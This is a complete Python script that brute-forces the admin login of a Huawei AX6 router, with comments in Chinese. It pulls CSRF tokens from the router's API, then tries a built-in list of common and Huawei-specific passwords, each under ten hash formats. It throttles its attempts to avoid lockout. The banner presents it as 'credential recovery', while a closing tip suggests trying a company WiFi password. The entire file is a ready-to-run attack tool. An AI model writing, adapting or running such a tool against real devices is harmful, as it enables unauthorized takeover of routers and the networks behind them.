#!/usr/bin/env python3
"""
华为AX6路由器密码爆破工具
基于 routersploit (13k⭐) + thc-hydra 的技术原理
支持：
  - 自动获取CSRF token + salt
  - 多种密码哈希算法尝试
  - 常见密码字典
  - 华为Hilink协议逆向
"""

import json
import hmac
import hashlib
import urllib.request
import urllib.error
import base64
import sys
import time

ROUTER_IP = "192.168.1.1"
BASE_URL = f"http://{ROUTER_IP}"

# ── 常见的华为路由器密码 ──────────────────────────────────
PASSWORDS = [    # 默认组合
        "admin", "", "password", "123456", "888888", "12345678",
    "123456789", "111111", "000000", "666666", "123123",
    
    # 华为相关
    "huawei", "Huawei", "HUAWEI", "Huawei@123", "Huawei123",
    "telecomadmin", "admintelecom",
    
    # 中国用户常用
    "a123456", "admin123", "123321", "521521", "520520",
    "qwerty", "qwerty123", "1234", "12345", "999999",
    "1234567890", "abc123", "abcdef", "654321",
    "147258", "159357", "112233", "123qwe", "qwe123",
    "admin888", "root123", "root", "test",
    
    # WiFi密码常见
    "88888888", "66668888", "123456789a", "a123456789",
    "Aa123456", "Abc123456", "Admin123",
    
    # 华为AX系列
    "admin@huawei", "admin@Huawei", "admin@123",
    "Password", "PASSWORD", "passwd",
    "WiFi密码",  # 有可能就是WiFi密码
]

# ── 加盐算法 ──────────────────────────────────────────────
def compute_hash(password: str, csrf_param: str, csrf_token: str) -> list[dict]:
    """
    尝试多种华为路由器密码哈希算法
    返回: [(算法名, 哈希值), ...]
    """
    results = []
    
    # 算法1: SHA256(password) 大写
    h1 = hashlib.sha256(password.encode()).hexdigest().upper()
    results.append(("sha256(pwd)", h1))
    
    # 算法2: SHA256(password) 小写
    h2 = hashlib.sha256(password.encode()).hexdigest().lower()
    results.append(("sha256(pwd)_low", h2))
    
    # 算法3: SHA256(password + csrf_param)
    h3 = hashlib.sha256((password + csrf_param).encode()).hexdigest().upper()
    results.append(("sha256(pwd+csrf)", h3))
    
    # 算法4: SHA256(csrf_param + password)
    h4 = hashlib.sha256((csrf_param + password).encode()).hexdigest().upper()
    results.append(("sha256(csrf+pwd)", h4))
    
    # 算法5: MD5(password)
    h5 = hashlib.md5(password.encode()).hexdigest().upper()
    results.append(("md5(pwd)", h5))
    
    # 算法6: MD5(password + csrf_param)
    h6 = hashlib.md5((password + csrf_param).encode()).hexdigest().upper()
    results.append(("md5(pwd+csrf)", h6))
    
    # 算法7: MD5(csrf_param + password)
    h7 = hashlib.md5((csrf_param + password).encode()).hexdigest().upper()
    results.append(("md5(csrf+pwd)", h7))
    
    # 算法8: 明文发送
    results.append(("plaintext", password))
    
    # 算法9: Base64(password)
    h9 = base64.b64encode(password.encode()).decode()
    results.append(("base64", h9))
    
    # 算法10: HMAC-SHA256
    h10 = hmac.new(csrf_param.encode(), password.encode(), hashlib.sha256).hexdigest().upper()
    results.append(("hmac-sha256", h10))
    
    return results


def try_login(password: str, csrf_param: str, csrf_token: str, hash_value: str, hash_name: str) -> tuple[bool, str]:
    """
    尝试用一种哈希格式登录
    
    Returns:
        (success, response_text)
    """
    data = json.dumps({
        "UserName": "admin",
        "Password": hash_value,
        "csrf": {
            "csrf_param": csrf_param,
            "csrf_token": csrf_token,
        }
    }).encode()
    
    req = urllib.request.Request(
        f"{BASE_URL}/api/system/user_login",
        data=data,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    )
    
    try:
        resp = urllib.request.urlopen(req, timeout=8)
        body = resp.read().decode("utf-8", errors="ignore")
        
        # 成功判断
        if '"error"' not in body.lower() and '"errcode"' not in body.lower():
            return True, body
        if '"error": 0' in body or '"errcode": 0' in body:
            return True, body
            
        return False, body
        
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        return False, f"HTTP {e.code}: {body[:200]}"
    except Exception as e:
        return False, f"Error: {str(e)[:100]}"


def get_csrf() -> tuple[str, str] | None:
    """获取CSRF token"""
    req = urllib.request.Request(
        f"{BASE_URL}/api/system/deviceinfo",
        headers={"User-Agent": "Mozilla/5.0"}
    )
    try:
        resp = urllib.request.urlopen(req, timeout=8)
        data = json.loads(resp.read().decode())
        csrf_param = data.get("csrf_param", "")
        csrf_token = data.get("csrf_token", "")
        first_login = data.get("other", {}).get("FirstLogin", 0)
        print(f"  ℹ️  FirstLogin={first_login} (0=已登录, 1=未登录过)")
        return csrf_param, csrf_token
    except Exception as e:
        print(f"  ❌ 获取CSRF失败: {e}")
        return None


def main():
    print(r"""
╔══════════════════════════════════════════╗
║   🔐 华为AX6路由器密码恢复              ║
║   Huawei AX6 Credential Recovery         ║
║   基于 routersploit + hydra 技术原理     ║
╚══════════════════════════════════════════╝
    """)
    
    # Step 1: 获取CSRF
    print(f"📡 连接 {ROUTER_IP} ...")
    csrf = get_csrf()
    if not csrf:
        print("❌ 无法获取CSRF Token，路由器不可达")
        return
    
    csrf_param, csrf_token = csrf
    print(f"  ✅ csrf_param: {csrf_param[:20]}...")
    print(f"  ✅ csrf_token: {csrf_token[:20]}...")
    
    # Step 2: 尝试所有密码
    print(f"\n🔑 正在尝试 {len(PASSWORDS)} 个常用密码...")
    total_attempts = 0
    
    for i, pwd in enumerate(PASSWORDS):
        display_pwd = pwd if pwd else "(空)"
        
        # 对该密码尝试所有哈希算法
        hashes = compute_hash(pwd, csrf_param, csrf_token)
        
        for hash_name, hash_val in hashes:
            total_attempts += 1
            
            success, response = try_login(pwd, csrf_param, csrf_token, hash_val, hash_name)
            
            # 进度显示
            print(f"  [{total_attempts:3d}] {display_pwd:15s} via {hash_name:20s}", end="")
            
            if success:
                print(f"  ✅ 成功！！！")
                print(f"\n{'='*60}")
                print(f"🎉 密码找到了！！！")
                print(f"{'='*60}")
                print(f"   密码: {pwd}")
                print(f"   算法: {hash_name}")
                print(f"   哈希: {hash_val[:40]}...")
                print(f"   响应: {response[:100]}")
                print(f"{'='*60}")
                print(f"\n🌐 登录: http://{ROUTER_IP}/")
                print(f"👤 用户名: admin")
                print(f"🔑 密码:   {pwd}")
                return
            
            # 如果返回错误码不是2640003，说明API有变化
            if "2640003" not in response and "4784264" not in response and total_attempts <= 5:
                print(f"  ❓ 非预期响应: {response[:60]}")
            else:
                print(f"  ❌")
            
            # 限速，防止被锁
            time.sleep(0.3)
        
        # 每5个密码休息一下
        if (i + 1) % 5 == 0:
            print(f"  ⏸️  已试 {i+1} 个密码共 {total_attempts} 次哈希...")
            time.sleep(1)
    
    print(f"\n{'='*60}")
    print(f"❌ 共尝试 {total_attempts} 次，未找到密码")
    print(f"{'='*60}")
    print(f"\n💡 建议:")
    print(f"   🅰 捅Reset键（路由器屁股小孔，按住2秒重置）")
    print(f"   🅱 WiFi密码就是后台密码，试一下公司WiFi密码")
    print(f"   🅲 看路由器底部标签（可能有默认密码）")


if __name__ == "__main__":
    main()